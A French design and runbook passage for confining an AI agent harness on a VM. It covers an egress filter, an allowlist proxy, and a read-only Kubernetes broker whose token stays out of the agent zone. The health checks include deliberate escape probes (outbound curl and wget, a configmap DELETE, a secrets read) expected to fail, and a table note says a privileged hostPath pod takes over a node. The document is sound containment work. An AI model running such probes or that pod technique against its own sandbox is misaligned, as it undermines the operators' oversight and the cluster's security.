| Vault / OpenBao / SPIFFE / OIDC apiserver | Se justifie quand il y a des secrets d'infrastructure à protéger. Complexité non testée = risque en soi. | Le jour où un vrai secret entre dans le périmètre. |
| Kyverno / OPA Gatekeeper côté cluster | En lecture seule, n'apporte rien. | Le jour où l'agent obtient un **verbe d'écriture** (le RBAC ne peut pas inspecter le contenu d'un manifeste : avec `create pods`, un pod `privileged` + `hostPath: /` possède le nœud). |
| Second VM pour la zone de confiance | Frontière interne faible, compensée par l'absence de secrets. | Quand un secret d'infrastructure entre dans le périmètre. |
| Outbox + broker de branches (`git am`, `format-patch`) | Surdimensionné : en GitOps, une branche est inoffensive. L'invariant est « pas de droit d'application ». La validation se fait en CI sur la PR (Phase 5). | Si le harnais doit agir **sans validation humaine** — aucun proxy ne peut distinguer une bonne proposition d'une mauvaise. |
| `kube-rbac-proxy` | Authentifie l'**appelant** avec le jeton de l'appelant → le harnais devrait *avoir* un jeton. | — |
| Renouvellement du jeton du broker par timer (TokenRequest) | Pour frapper un jeton il faut un credential, et le seul que le broker détiendrait *est* le jeton : au mieux un jeton long qui en produit des courts, avec une unité, un timer et un mode de panne en plus. | Le jour où le cluster sait émettre un jeton sans secret d'amorçage (identité de charge de travail, OIDC). |
| RBAC du broker appliqué par le play | Le dépôt ne possède pas le cluster, et l'appliquer exigerait d'y laisser un kubeconfig d'admin sur le poste. Le manifeste est livré, la pose appartient au déploiement. | Le jour où le projet déploie aussi le cluster. |
| Jeton du broker **domicilié dans un coffre** (OpenBao/Vault, source de vérité, matérié par ESO) | Le cluster **frappe** ce jeton : le contrôleur remplit `.data.token` et la valeur est signée par l'apiserver — un coffre ne peut donc pas en être la source, seulement un second domicile. Et la livraison par ESO supposerait que la VM **lise un Secret k8s**, c'est-à-dire le contrôle même que ce design ferme : le credential du broker ne peut pas venir par le broker. | Un IdP externe authentifiant l'apiserver (OIDC), ou le jour où un composant de la VM renouvellerait lui-même son jeton (voir la ligne TokenRequest). |
| Renouvellement automatique du jeton (CronJob cluster + PushSecret + timer sur la VM) | Quatre composants et deux secrets de plus pour renouveler **un** credential en lecture seule, loopback seul, illisible par l'agent — dont la vraie mitigation est la **révocation** (supprimer le Secret invalide l'ancien jeton immédiatement), pas la rotation. | Une exigence de conformité qui impose une durée de vie bornée. |

---

## ⚡ 5. Guide de reprise rapide

### 🔗 Accès SSH

```bash
ssh <admin>@<vm_ip>              # admin
ssh {{ harness_name }}@<vm_ip>   # zone agent
```

### 🧪 Vérifications de santé

```bash
# Sandbox gVisor (conteneurs lancés par l'agent)
ssh {{ harness_name }}@<vm_ip> "docker run --rm alpine uname -a"
# Attendu : Linux ... 4.19.0-gvisor ...

# Gateway d'inférence (Phase 2), depuis la zone agent : les alias déclarés
ssh {{ harness_name }}@<vm_ip> "curl -s http://127.0.0.1:4000/v1/models"
# Le port amont du provider est fermé à la zone agent — attendu en échec (rc=28)
ssh {{ harness_name }}@<vm_ip> "curl -m 4 -sS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:11434/api/tags"
# Le gateway tourne-t-il bien hors de l'uid du harnais ?
ssh <admin>@<vm_ip> "systemctl show inference-gateway -p User -p ActiveState"

# Egress (Phase 1) : la zone agent ne sort pas, le loopback reste ouvert
ssh {{ harness_name }}@<vm_ip> "curl -m 3 -sS -o /dev/null -w '%{http_code}\n' https://example.com"
# Attendu : échec (résolution comprise).
# Conteneur couvert par le même filtre :
ssh {{ harness_name }}@<vm_ip> "podman run --rm alpine wget -T3 -q -O- http://1.1.1.1"
# Le filtre est-il RÉELLEMENT chargé ? (un run interrompu le laisse levé)
ssh <admin>@<vm_ip> "sudo nft list table inet agent_egress"

# Proxy egress L7 (Phase 3) : l'allowlist tient, et le proxy est le SEUL chemin
ssh {{ harness_name }}@<vm_ip> "curl -m 5 -sS -x http://127.0.0.1:8080 https://<domaine_allowlisté>"
# Attendu : 200. Hors allowlist ou destination interne : 403 (« CONNECT tunnel failed, response 403 »).
# Sans proxy, la zone agent ne sort plus et ne résout plus : le proxy est bien le seul chemin.
ssh {{ harness_name }}@<vm_ip> "curl -m 4 -sS -o /dev/null -w '%{http_code}\n' https://<domaine_allowlisté>"
ssh {{ harness_name }}@<vm_ip> "getent hosts <domaine_allowlisté> || echo 'pas de résolution'"
# Le proxy tourne-t-il hors de l'uid du harnais, et que décide-t-il ? (une ligne par requête)
ssh <admin>@<vm_ip> "systemctl show egress-proxy -p User -p ActiveState; journalctl -u egress-proxy -g 'egress-(allow|deny)' -n 20"

# Durcissement du harnais (après Phase 8)
systemd-analyze security {{ harness_name }}.service

# Broker Kubernetes (Phase 4) : la zone agent n'a qu'une adresse, jamais le jeton
ssh {{ harness_name }}@<vm_ip> "curl -s http://127.0.0.1:8001/api"
# Attendu : la liste des versions de l'API. Une écriture est refusée DEUX fois : par le filtre du
# proxy (403) puis par le RBAC ; les chemins secrets/exec/portforward le sont aussi.
ssh {{ harness_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X DELETE http://127.0.0.1:8001/api/v1/namespaces/sre-agent/configmaps/x"
ssh {{ harness_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8001/api/v1/namespaces/sre-agent/secrets"
# Le broker tourne-t-il hors de l'uid du harnais, avec un jeton qui authentifie ?
ssh <admin>@<vm_ip> "systemctl show k8s-broker -p User -p ActiveState"
ssh <admin>@<vm_ip> "journalctl -u k8s-broker -n 20"
# Ce que le jeton peut réellement faire — côté cluster, avec le kubeconfig du broker
kubectl --kubeconfig=ansible/files/k8s-broker.kubeconfig auth can-i --list

# Validation du code local
tofu -chdir=iac validate && ansible-lint
```

### 📌 Point de départ recommandé

**Phases 0, 1, 2, 3 et 4 faites** (documentation corrigée ; egress de la zone agent filtré ; gateway d'inférence en zone de confiance, table d'alias et port amont fermé ; proxy L7 à allowlist, deux niveaux ; broker Kubernetes en lecture seule, jeton hors de la zone agent). Prochaine étape : **Phase 7** (observabilité : elle porte la piste d'audit des prompts, l'audit des routes d'admin du gateway, la cible commune des journaux du proxy et le nouveau chemin loopback du broker). La **Phase 5** ne se fait que si un cas d'usage le demande, et **Phase 8** une fois le harnais choisi et installable — c'est elle qui portera l'outillage dans l'image du harnais.
